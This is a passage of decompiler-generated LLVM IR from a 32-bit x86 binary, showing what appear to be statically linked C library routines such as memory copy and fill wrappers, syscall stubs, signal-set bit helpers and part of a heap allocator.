  %v3_80500cb = add i32 %arg2, -1
  %v4_80500cb = add i32 %v3_80500cb, %arg3
  %v5_80500cb = inttoptr i32 %v4_80500cb to i8*
  %v3_80500cf = add i32 %v4_80500b5, -1
  %v4_80500cf = add i32 %v3_80500cf, %arg3
  %v5_80500cf = inttoptr i32 %v4_80500cf to i8*
  %v7_80500d4 = call i8* @_memcpy(i8* %v5_80500cf, i8* %v5_80500cb, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80500d7

dec_label_pc_80500d7:                             ; preds = %dec_label_pc_80500c5, %dec_label_pc_80500cb
  %v2_80500d7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80500d7, i32* @esi, align 4
  ret i32 %v4_80500b5

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80500d7, { 1, 0 }
}

define i32 @function_80500da(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80500da:
  %v0_80500da = load i32, i32* @edi, align 4
  %v4_80500e3 = ptrtoint i8* %arg1 to i32
  %v5_80500e7 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_80500da, i32* @edi, align 4
  ret i32 %v4_80500e3

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_80500ef(i32 %arg1) local_unnamed_addr {
dec_label_pc_80500ef:
  %stack_var_-4 = alloca i32, align 4
  %v2_80500f2 = ptrtoint i32* %stack_var_-4 to i32
  %v2_80500fb = inttoptr i32 %arg1 to i8*
  %v3_80500fb = call i32 @function_80522f9(i8* %v2_80500fb, i32 %v2_80500f2)
  %v1_8050106 = icmp eq i32 %v3_80500fb, 0
  br i1 %v1_8050106, label %dec_label_pc_805010e, label %dec_label_pc_805010a

dec_label_pc_805010a:                             ; preds = %dec_label_pc_80500ef
  %v3_805010a = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805010e

dec_label_pc_805010e:                             ; preds = %dec_label_pc_80500ef, %dec_label_pc_805010a
  %v0_805010e = phi i32 [ -1, %dec_label_pc_80500ef ], [ %v3_805010a, %dec_label_pc_805010a ]
  ret i32 %v0_805010e

; uselistorder directives
  uselistorder label %dec_label_pc_805010e, { 1, 0 }
}

define i32 @function_8050114(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050114:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805012f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050136 = call i32 @function_8051d43(i32 5, i32 %v2_805012f)
  ret i32 %v2_8050136

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805013f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805013f:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805015a = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050161 = call i32 @function_8051d43(i32 2, i32 %v2_805015a)
  ret i32 %v2_8050161

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805016a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805016a:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050185 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805018c = call i32 @function_8051d43(i32 3, i32 %v2_8050185)
  ret i32 %v2_805018c

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050195(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050195:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80501b0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80501b7 = call i32 @function_8051d43(i32 6, i32 %v2_80501b0)
  ret i32 %v2_80501b7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80501c0() local_unnamed_addr {
dec_label_pc_80501c0:
  %stack_var_-20 = alloca i32, align 4
  %v2_80501eb = ptrtoint i32* %stack_var_-20 to i32
  %v2_80501f2 = call i32 @function_8051d43(i32 15, i32 %v2_80501eb)
  ret i32 %v2_80501f2
}

define i32 @function_80501fb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80501fb:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805020e = ptrtoint i32* %stack_var_-8 to i32
  %v2_8050215 = call i32 @function_8051d43(i32 4, i32 %v2_805020e)
  ret i32 %v2_8050215

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_805021e() local_unnamed_addr {
dec_label_pc_805021e:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050241 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8050248 = call i32 @function_8051d43(i32 10, i32 %v2_8050241)
  ret i32 %v2_8050248
}

define i32 @function_8050251() local_unnamed_addr {
dec_label_pc_8050251:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050284 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805028b = call i32 @function_8051d43(i32 12, i32 %v2_8050284)
  ret i32 %v2_805028b
}

define i32 @function_8050294() local_unnamed_addr {
dec_label_pc_8050294:
  %stack_var_-16 = alloca i32, align 4
  %v2_80502b7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80502be = call i32 @function_8051d43(i32 9, i32 %v2_80502b7)
  ret i32 %v2_80502be
}

define i32 @function_80502c7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80502c7:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80502fa = ptrtoint i32* %stack_var_-24 to i32
  %v2_8050301 = call i32 @function_8051d43(i32 11, i32 %v2_80502fa)
  ret i32 %v2_8050301

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_805030a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805030a:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8050335 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805033c = call i32 @function_8051d43(i32 14, i32 %v2_8050335)
  ret i32 %v2_805033c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8050345(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050345:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050360 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050367 = call i32 @function_8051d43(i32 1, i32 %v2_8050360)
  ret i32 %v2_8050367

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8051d43, { 5, 4, 11, 3, 8, 2, 7, 1, 9, 0, 6, 10 }
}

define i32 @function_8050370(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050370:
  %v0_8050373 = call i32 @function_804fba5()
  %v0_8050378 = load i32, i32* @edx, align 4
  %v4_805037f = call i32 @function_804fc30(i32 %v0_8050373, i32 %arg1, i32 %v0_8050378, i32 %v0_8050378)
  ret i32 %v4_805037f

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_804fc30, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_804fba5, { 0, 2, 1 }
}

define i32 @function_8050388(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050388:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80503a0, label %dec_label_pc_8050393

dec_label_pc_8050393:                             ; preds = %dec_label_pc_8050388
  %v1_8050393 = add i32 %arg1, -64
  %v3_8050393 = sub i32 63, %arg1
  %v4_8050393 = and i32 %v3_8050393, %arg1
  %v5_8050393 = icmp slt i32 %v4_8050393, 0
  %v6_8050393 = icmp eq i32 %v1_8050393, 0
  %v7_8050393 = icmp slt i32 %v1_8050393, 0
  %v3_8050396 = icmp eq i1 %v7_8050393, %v5_8050393
  %v4_8050396 = icmp eq i1 %v6_8050393, false
  %v5_8050396 = and i1 %v4_8050396, %v3_8050396
  br i1 %v5_8050396, label %dec_label_pc_80503a0, label %dec_label_pc_8050398

dec_label_pc_8050398:                             ; preds = %dec_label_pc_8050393
  %v4_805039b = call i32 @function_805049e(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80503a0

dec_label_pc_80503a0:                             ; preds = %dec_label_pc_8050393, %dec_label_pc_8050388, %dec_label_pc_8050398
  %v1_80503a0 = call i32 @function_8050089(i32 ptrtoint (i32* @0 to i32))
  %v1_80503a5 = inttoptr i32 %v1_80503a0 to i32*
  store i32 22, i32* %v1_80503a5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8050393, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80503a0, { 2, 0, 1 }
}

define i32 @function_80503b2(i32 %arg1) local_unnamed_addr {
dec_label_pc_80503b2:
  %v3_80503c0 = inttoptr i32 %arg1 to i8*
  %v4_80503c0 = call i32 @function_80500da(i8* %v3_80503c0, i32 0, i32 128)
  ret i32 0
}

define i32 @function_80503cb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80503cb:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80503cb = load i32, i32* @ebx, align 4
  %v15_80503cc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80503e0 = icmp eq i32 %arg2, -1
  br i1 %v10_80503e0, label %dec_label_pc_80503ee, label %dec_label_pc_80503e5

dec_label_pc_80503e5:                             ; preds = %dec_label_pc_80503cb
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_80503ee, label %dec_label_pc_80503e9

dec_label_pc_80503e9:                             ; preds = %dec_label_pc_80503e5
  %v7_80503ec = icmp sgt i32 %arg1, 64
  br i1 %v7_80503ec, label %dec_label_pc_80503ee, label %dec_label_pc_8050409.lr.ph

dec_label_pc_80503ee:                             ; preds = %dec_label_pc_80503e9, %dec_label_pc_80503e5, %dec_label_pc_80503cb
  %v1_80503ee = call i32 @function_8050089(i32 %v0_80503cb)
  store i32 %v1_80503ee, i32* %eax.global-to-local, align 4
  %v1_80503f3 = inttoptr i32 %v1_80503ee to i32*
  store i32 22, i32* %v1_80503f3, align 4
  br label %dec_label_pc_805046f

dec_label_pc_8050409.lr.ph:                       ; preds = %dec_label_pc_80503e9
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805040927 = add i32 %v15_80503cc, 284
  %v5_805040928 = inttoptr i32 %v4_805040927 to i32*
  store i32 0, i32* %v5_805040928, align 4
  %v0_805041429 = load i32, i32* %eax.global-to-local, align 4
  %v1_805041430 = add i32 %v0_805041429, -1
  %v9_805041431 = icmp slt i32 %v1_805041430, 0
  store i32 %v1_805041430, i32* %eax.global-to-local, align 4
  %v1_805041532 = icmp eq i1 %v9_805041431, false
  br i1 %v1_805041532, label %dec_label_pc_8050409.dec_label_pc_8050409_crit_edge, label %dec_label_pc_8050417

dec_label_pc_8050409.dec_label_pc_8050409_crit_edge: ; preds = %dec_label_pc_8050409.lr.ph, %dec_label_pc_8050409.dec_label_pc_8050409_crit_edge
  %v1_805041433 = phi i32 [ %v1_8050414, %dec_label_pc_8050409.dec_label_pc_8050409_crit_edge ], [ %v1_805041430, %dec_label_pc_8050409.lr.ph ]
  %v0_8050409.pre = load i32, i32* @esp, align 4
  %v2_8050409 = mul i32 %v1_805041433, 4
  %v3_8050409 = add i32 %v0_8050409.pre, 160
  %v4_8050409 = add i32 %v3_8050409, %v2_8050409
  %v5_8050409 = inttoptr i32 %v4_8050409 to i32*
  store i32 0, i32* %v5_8050409, align 4
  %v0_8050414 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050414 = add i32 %v0_8050414, -1
  %v9_8050414 = icmp slt i32 %v1_8050414, 0
  store i32 %v1_8050414, i32* %eax.global-to-local, align 4
  %v1_8050415 = icmp eq i1 %v9_8050414, false
  br i1 %v1_8050415, label %dec_label_pc_8050409.dec_label_pc_8050409_crit_edge, label %dec_label_pc_8050417

dec_label_pc_8050417:                             ; preds = %dec_label_pc_8050409.dec_label_pc_8050409_crit_edge, %dec_label_pc_8050409.lr.ph
  %v0_8050417 = load i32, i32* @edx, align 4
  %v2_805041a = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805041a, i32* %eax.global-to-local, align 4
  %v4_8050422 = call i32 @function_805049e(i32 %v2_805041a, i32 %arg1, i32 %v0_8050417, i32 %v0_8050417)
  store i32 %v4_8050422, i32* %eax.global-to-local, align 4
  %v2_805042a = icmp slt i32 %v4_8050422, 0
  br i1 %v2_805042a, label %dec_label_pc_805046f, label %dec_label_pc_805042e

dec_label_pc_805042e:                             ; preds = %dec_label_pc_8050417
  %v4_8050436 = call i32 @function_805047a(i32 ptrtoint (i32* @global_var_80532c0.186 to i32), i32 %arg1, i32 %v4_8050422, i32 %v4_8050422)
  %v2_805044f = ptrtoint i32* %stack_var_-284 to i32
  %v2_8050454 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050454, i32* %eax.global-to-local, align 4
  %v4_805045d = call i32 @function_8051c4f(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_805044f)
  store i32 %v4_805045d, i32* %eax.global-to-local, align 4
  %v2_8050465 = icmp slt i32 %v4_805045d, 0
  br i1 %v2_8050465, label %dec_label_pc_805046f, label %dec_label_pc_8050469

dec_label_pc_8050469:                             ; preds = %dec_label_pc_805042e
  %v3_8050469 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8050472

dec_label_pc_805046f:                             ; preds = %dec_label_pc_805042e, %dec_label_pc_8050417, %dec_label_pc_80503ee
  br label %dec_label_pc_8050472

dec_label_pc_8050472:                             ; preds = %dec_label_pc_8050469, %dec_label_pc_805046f
  %storemerge = phi i32 [ -1, %dec_label_pc_805046f ], [ %v3_8050469, %dec_label_pc_8050469 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050414, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 10, 11, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_8050472, { 1, 0 }
  uselistorder label %dec_label_pc_8050409.dec_label_pc_8050409_crit_edge, { 1, 0 }
}

define i32 @function_805047a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805047a:
  %v1_8050488 = add i32 %arg2, -1
  %v1_805048b = urem i32 %v1_8050488, 32
  %v2_805048b = icmp eq i32 %v1_805048b, 0
  %v2_805048e = udiv i32 %v1_8050488, 32
  br i1 %v2_805048b, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_805047a
  %v5_8050491 = shl i32 1, %v1_805048b
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_805047a, %bb
  %v6_8050493 = phi i32 [ 1, %dec_label_pc_805047a ], [ %v5_8050491, %bb ]
  %v2_8050493 = mul nuw nsw i32 %v2_805048e, 4
  %v3_8050493 = add i32 %v2_8050493, %arg1
  %v4_8050493 = inttoptr i32 %v3_8050493 to i32*
  %v5_8050493 = load i32, i32* %v4_8050493, align 4
  %v7_8050493 = and i32 %v5_8050493, %v6_8050493
  %v8_8050493 = icmp eq i32 %v7_8050493, 0
  %v1_8050497 = icmp eq i1 %v8_8050493, false
  %v2_8050497 = zext i1 %v1_8050497 to i32
  ret i32 %v2_8050497

; uselistorder directives
  uselistorder i32 %v1_805048b, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_805049e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805049e:
  %stack_var_-4 = alloca i32, align 4
  %v0_805049e = load i32, i32* @ebx, align 4
  store i32 %v0_805049e, i32* %stack_var_-4, align 4
  %v1_80504ac = add i32 %arg2, -1
  %v1_80504af = urem i32 %v1_80504ac, 32
  %v2_80504af = icmp eq i32 %v1_80504af, 0
  store i32 %v1_80504af, i32* @ecx, align 4
  %v2_80504b2 = udiv i32 %v1_80504ac, 32
  store i32 %v2_80504b2, i32* @edx, align 4
  br i1 %v2_80504af, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_805049e
  %v5_80504b5 = shl i32 1, %v1_80504af
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_805049e, %bb
  %v6_80504b7 = phi i32 [ 1, %dec_label_pc_805049e ], [ %v5_80504b5, %bb ]
  %v2_80504b7 = mul nuw nsw i32 %v2_80504b2, 4
  %v3_80504b7 = add i32 %v2_80504b7, %arg1
  %v4_80504b7 = inttoptr i32 %v3_80504b7 to i32*
  %v5_80504b7 = load i32, i32* %v4_80504b7, align 4
  %v7_80504b7 = or i32 %v5_80504b7, %v6_80504b7
  store i32 %v7_80504b7, i32* %v4_80504b7, align 4
  %v2_80504bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80504bc, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80504b2, { 1, 0 }
  uselistorder i32 %v1_80504af, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80504be() local_unnamed_addr {
dec_label_pc_80504be:
  %v0_80504be = load i32, i32* @eax, align 4
  %v6_80504d1 = icmp ugt i32 %v0_80504be, 16777215
  br i1 %v6_80504d1, label %dec_label_pc_80504e2, label %dec_label_pc_80504d3

dec_label_pc_80504d3:                             ; preds = %dec_label_pc_80504be
  %tmp = icmp ult i32 %v0_80504be, 256
  %v2_80504c1 = udiv i32 %v0_80504be, 256
  %v2_80504d3 = call i32 @llvm.ctlz.i32(i32 %v2_80504c1, i1 true)
  %v3_80504d3 = xor i32 %v2_80504d3, 31
  %v5_80504d3 = select i1 %tmp, i32 95, i32 %v3_80504d3
  %v1_80504d6 = add nuw nsw i32 %v5_80504d3, 6
  %v2_80504d9 = urem i32 %v1_80504d6, 32
  %v4_80504d9 = icmp eq i32 %v2_80504d9, 0
  br i1 %v4_80504d9, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80504d3
  %v5_80504d9 = lshr i32 %v0_80504be, %v2_80504d9
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80504d3, %bb
  %v0_80504db = phi i32 [ %v0_80504be, %dec_label_pc_80504d3 ], [ %v5_80504d9, %bb ]
  %v1_80504db = urem i32 %v0_80504db, 4
  %v2_80504de = mul nuw nsw i32 %v5_80504d3, 4
  %v3_80504de = or i32 %v1_80504db, 32
  %v4_80504de = add nuw nsw i32 %v3_80504de, %v2_80504de
  br label %dec_label_pc_80504e2

dec_label_pc_80504e2:                             ; preds = %dec_label_pc_80504be, %bb4
  %v0_80504e3 = phi i32 [ 95, %dec_label_pc_80504be ], [ %v4_80504de, %bb4 ]
  ret i32 %v0_80504e3

; uselistorder directives
  uselistorder i32 %v2_80504d9, { 1, 0 }
  uselistorder i32 %v0_80504be, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80504e2, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_80504e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80504e4:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80504e4 = load i32, i32* @ebp, align 4
  %v0_80504e5 = load i32, i32* @edi, align 4
  %v0_80504e6 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80504f9 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80504f9, i32* @eax, align 4
  store i32 %v2_80504f9, i32* %stack_var_-92, align 4
  %v2_80504fe = call i32 @function_8051a10(i32 %v2_80504f9, i32 134552077)
  store i32 %v2_80504fe, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805303c.187 to i32), i32* %stack_var_-92, align 4
  %v1_805050a = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_805303c.187 to i32))
  store i32 %v1_805050a, i32* %eax.global-to-local, align 4
  %v0_8050512 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8050512, -32
  br i1 %tmp124, label %dec_label_pc_8050529, label %dec_label_pc_8050517

dec_label_pc_8050517:                             ; preds = %dec_label_pc_80504e4
  %v0_8050517 = load i32, i32* %stack_var_-92, align 4
  %v1_8050517 = call i32 @function_8050089(i32 %v0_8050517)
  store i32 %v1_8050517, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805051e = inttoptr i32 %v1_8050517 to i32*
  store i32 12, i32* %v1_805051e, align 4
  br label %dec_label_pc_8050c4e

dec_label_pc_8050529:                             ; preds = %dec_label_pc_80504e4
  %v1_8050529 = add i32 %v0_8050512, 11
  %tmp125 = icmp ult i32 %v1_8050529, 16
  br i1 %tmp125, label %dec_label_pc_8050540, label %dec_label_pc_8050539

dec_label_pc_8050539:                             ; preds = %dec_label_pc_8050529
  %v1_8050539 = and i32 %v1_8050529, -8
  br label %dec_label_pc_8050540

dec_label_pc_8050540:                             ; preds = %dec_label_pc_8050529, %dec_label_pc_8050539
  %storemerge135 = phi i32 [ %v1_8050539, %dec_label_pc_8050539 ], [ %v1_8050529, %dec_label_pc_8050529 ]
  %v1_80508d8 = phi i32 [ %v1_8050539, %dec_label_pc_8050539 ], [ 16, %dec_label_pc_8050529 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8050540 = load i8, i8* @global_var_8053340.188, align 1
  %v1_8050540 = sext i8 %v0_8050540 to i32
  store i32 %v1_8050540, i32* @ebx, align 4
  %v3_8050546 = urem i8 %v0_8050540, 2
  %v4_8050546 = icmp eq i8 %v3_8050546, 0
  %v1_8050549 = icmp eq i1 %v4_8050546, false
  br i1 %v1_8050549, label %dec_label_pc_8050568, label %dec_label_pc_805054b

dec_label_pc_805054b:                             ; preds = %dec_label_pc_8050540
  %v2_805054b = icmp eq i8 %v0_8050540, 0
  %v1_805054d = icmp eq i1 %v2_805054b, false
  br i1 %v1_805054d, label %dec_label_pc_8050843, label %dec_label_pc_8050553

dec_label_pc_8050553:                             ; preds = %dec_label_pc_805054b
  store i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32* %stack_var_-92, align 4
  %v2_805055b = call i32 @function_8051101(i32* bitcast (i8* @global_var_8053340.188 to i32*))
  store i32 %v2_805055b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050843

dec_label_pc_8050568:                             ; preds = %dec_label_pc_8050540
  %v11_8050568 = trunc i32 %v1_80508d8 to i8
  %v8_805056c = icmp ugt i8 %v11_8050568, %v0_8050540
  br i1 %v8_805056c, label %dec_label_pc_8050589, label %dec_label_pc_805056e

dec_label_pc_805056e:                             ; preds = %dec_label_pc_8050568
  %v2_8050572 = udiv i32 %v1_80508d8, 2
  store i32 %v2_8050572, i32* %eax.global-to-local, align 4
  %v1_8050574 = add i32 %v2_8050572, ptrtoint (i8* @global_var_8053340.188 to i32)
  store i32 %v1_8050574, i32* %ecx.global-to-local, align 4
  %v1_805057a = add i32 %v2_8050572, add (i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32 -4)
  %v2_805057a = inttoptr i32 %v1_805057a to i32*
  %v3_805057a = load i32, i32* %v2_805057a, align 4
  store i32 %v3_805057a, i32* @edx, align 4
  %v1_805057d = icmp eq i32 %v3_805057a, 0
  br i1 %v1_805057d, label %dec_label_pc_8050589, label %dec_label_pc_8050581

dec_label_pc_8050581:                             ; preds = %dec_label_pc_805056e
  %v1_8050581 = add i32 %v3_805057a, 8
  %v2_8050581 = inttoptr i32 %v1_8050581 to i32*
  %v3_8050581 = load i32, i32* %v2_8050581, align 4
  store i32 %v3_8050581, i32* %eax.global-to-local, align 4
  store i32 %v3_8050581, i32* %v2_805057a, align 4
  br label %dec_label_pc_80505c2

dec_label_pc_8050589:                             ; preds = %dec_label_pc_805056e, %dec_label_pc_8050568
  %v8_8050589 = icmp ult i32 %v1_80508d8, 255
  %v6_8050591 = icmp ugt i32 %v1_80508d8, 255
  store i32 %v1_80508d8, i32* @eax, align 4
  br i1 %v6_8050591, label %dec_label_pc_80505ca, label %dec_label_pc_8050593

dec_label_pc_8050593:                             ; preds = %dec_label_pc_8050589
  %v2_8050597 = udiv i32 %v1_80508d8, 8
  store i32 %v2_8050597, i32* %eax.global-to-local, align 4
  %v1_805059e = mul nuw i32 %v2_8050597, 8
  %v2_805059e = add i32 %v1_805059e, ptrtoint (i32* @global_var_805336c.189 to i32)
  store i32 %v2_805059e, i32* %ecx.global-to-local, align 4
  %v1_80505a5 = add i32 %v1_805059e, add (i32 ptrtoint (i32* @global_var_805336c.189 to i32), i32 12)
  %v2_80505a5 = inttoptr i32 %v1_80505a5 to i32*
  %v3_80505a5 = load i32, i32* %v2_80505a5, align 4
  store i32 %v3_80505a5, i32* @edx, align 4
  %v12_80505a8 = icmp eq i32 %v3_80505a5, %v2_805059e
  br i1 %v12_80505a8, label %dec_label_pc_80506c6.preheader, label %dec_label_pc_80505b0

dec_label_pc_80505b0:                             ; preds = %dec_label_pc_8050593
  store i32 %v1_80508d8, i32* %ebx.global-to-local, align 4
  %v1_80505b4 = add i32 %v3_80505a5, 12
  %v2_80505b4 = inttoptr i32 %v1_80505b4 to i32*
  %v3_80505b4 = load i32, i32* %v2_80505b4, align 4
  store i32 %v3_80505b4, i32* %eax.global-to-local, align 4
  store i32 %v3_80505b4, i32* %v2_80505a5, align 4
  %v0_80505ba = load i32, i32* @edx, align 4
  %v1_80505ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80505ba = add i32 %v0_80505ba, 4
  %v3_80505ba = add i32 %v2_80505ba, %v1_80505ba
  %v4_80505ba = inttoptr i32 %v3_80505ba to i32*
  %v5_80505ba = load i32, i32* %v4_80505ba, align 4
  %v6_80505ba = or i32 %v5_80505ba, 1
  store i32 %v6_80505ba, i32* %v4_80505ba, align 4
  %v0_80505bf = load i32, i32* %ecx.global-to-local, align 4
  %v1_80505bf = load i32, i32* %eax.global-to-local, align 4
  %v2_80505bf = add i32 %v1_80505bf, 8
  %v3_80505bf = inttoptr i32 %v2_80505bf to i32*
  store i32 %v0_80505bf, i32* %v3_80505bf, align 4
  br label %dec_label_pc_80505c2

dec_label_pc_80505c2:                             ; preds = %dec_label_pc_805095f, %dec_label_pc_8050971, %dec_label_pc_8050581, %dec_label_pc_80505b0
  %v0_80505c2 = load i32, i32* @edx, align 4
  %v1_80505c2 = add i32 %v0_80505c2, 8
  store i32 %v1_80505c2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_80505ca:                             ; preds = %dec_label_pc_8050589
  %v0_80505ce = call i32 @function_80504be()
  store i32 %v0_80505ce, i32* %eax.global-to-local, align 4
  %v3_80505d3 = and i8 %v0_8050540, 2
  %v4_80505d3 = icmp eq i8 %v3_80505d3, 0
  %v6_80505d3 = zext i8 %v3_80505d3 to i32
  %v9_80505d3 = and i32 %v1_8050540, -256
  %v10_80505d3 = or i32 %v9_80505d3, %v6_80505d3
  store i32 %v10_80505d3, i32* @ebx, align 4
  br i1 %v4_80505d3, label %dec_label_pc_80506c6.preheader, label %dec_label_pc_80505e0

dec_label_pc_80505e0:                             ; preds = %dec_label_pc_80505ca
  store i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32* %stack_var_-92, align 4
  %v2_80505e8 = call i32 @function_8051101(i32* bitcast (i8* @global_var_8053340.188 to i32*))
  store i32 %v2_80505e8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506c6.preheader

dec_label_pc_80506c6.preheader:                   ; preds = %dec_label_pc_80505e0, %dec_label_pc_8050593, %dec_label_pc_80505ca
  %stack_var_-40.0.ph = phi i32 [ %v2_8050597, %dec_label_pc_8050593 ], [ %v0_80505ce, %dec_label_pc_80505e0 ], [ %v0_80505ce, %dec_label_pc_80505ca ]
  %v0_80506c69 = load i32, i32* @global_var_8053380.192, align 128
  store i32 %v0_80506c69, i32* @ebp, align 4
  %v9_80506cc15 = icmp eq i32 %v0_80506c69, 134558580
  %v1_80506d217 = icmp eq i1 %v9_80506cc15, false
